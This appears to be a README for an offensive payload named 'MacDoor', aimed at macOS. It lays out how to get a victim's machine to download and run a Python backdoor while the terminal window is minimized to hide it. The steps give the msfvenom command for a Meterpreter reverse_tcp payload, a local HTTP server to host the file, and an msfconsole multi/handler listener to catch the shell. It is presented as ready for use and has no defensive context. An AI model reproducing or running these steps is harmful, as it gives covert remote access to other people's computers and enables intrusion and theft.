# MacDoor - Python Backdoor Execution

* Author:     afsh4ck
* Version:    1.0
* Target:     MacOS
* Tested on:  Ventura 13.3.1
* Category:   Execution

# Description

Download a Python backdoor from our server, run it in terminal and minimize the terminal window.

# Steps

* Step 1: msfvenom -p python/meterpreter/reverse_tcp LHOST={your IP} LPORT=4444 -o backdoor.py  
* Step 2: mount a local server 'python3 -m http.server'  
* Step 3: msfconsole multi/handler listener open before the attack.

# Note

* You need to modify the script with your attacker IP and the port or your local server.

